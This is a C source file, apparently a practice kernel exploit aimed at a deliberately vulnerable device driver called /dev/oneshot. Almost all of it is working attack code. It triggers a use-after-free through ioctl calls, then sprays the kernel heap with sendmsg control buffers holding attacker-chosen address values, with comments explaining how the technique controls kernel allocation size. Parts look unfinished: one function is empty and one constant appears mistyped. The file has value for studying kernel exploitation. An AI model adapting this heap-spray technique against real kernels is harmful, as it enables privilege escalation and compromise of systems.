#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include "common.h"  /* kernelinit */


#define ALLOCATE 0x13370001
#define RELEASE 0x1337000
#define MMAP_ADDR 0x100000000000
#define BUFF_SIZE 96
int fd;
char buffer[0x2000];

// Used for breaking in gdb
void _pause_(char *data) {
    printf("%s\n", data);
}

void create_msg_queue() {
    
}

/**
* Here we are using the sendmsg syscall. This is a good
* one to use because the number of bytes allocated on the
* heap is determined by the user, this means we can determine
* which cache to use. The api is quite confusing and much of this
* was written after reading a lot of stackoverflow posts.
*/
void use_after_free_sendmsg(int fd, long target, long arg)
{
	char buff[BUFF_SIZE];
	struct msghdr msg = {0};
	struct sockaddr_in addr = {0};
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);

	memset(buff, 0x43, sizeof buff);

	memcpy(buff+56, &arg, sizeof(long));

	memcpy(buff+56+(sizeof(long)), &target, sizeof(long));
	

	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(6666);

	/* This is the data that will overwrite the vulnerable object in the heap */
        msg.msg_control = buff;

	/* This is the user controlled size, eventually kmalloc(msg_controllen) will occur */
        msg.msg_controllen = BUFF_SIZE; // should be chdr->cmsg_len but i want to force the size

        msg.msg_name = (caddr_t)&addr;
        msg.msg_namelen = sizeof(addr);

	ioctl(fd, ALLOCATE, NULL); // UAF object
	ioctl(fd, RELEASE, NULL);

	/* Heap spray */
	for(int i = 0; i < 100000; i++) {
               	sendmsg(sockfd, &msg, 0);
       	}

	/* Trigger */
	ioctl(fd, ALLOCATE, NULL);

}


void ioctl_alloc(char *data) {
    if (ioctl(fd, ALLOCATE, data) < 0) {
        perror("Allocation failed\n");
    }
}

void ioctl_free() {
    if (ioctl(fd, RELEASE, NULL) < 0) {
        perror("Free failed\n");
    }
}

int main () {
    printf("Opening oneshot\n");
    fd = SYSCHK(open("/dev/oneshot", O_RDWR));

    printf("Calling UAF sendmsg\n");
    use_after_free_sendmsg(fd, MMAP_ADDR, 0);
    _pause_("Sendmsg spray [1]");

    use_after_free_sendmsg(fd, MMAP_ADDR, 0);
    _pause_("Sendmsg spray [2]");
    return 0;
}
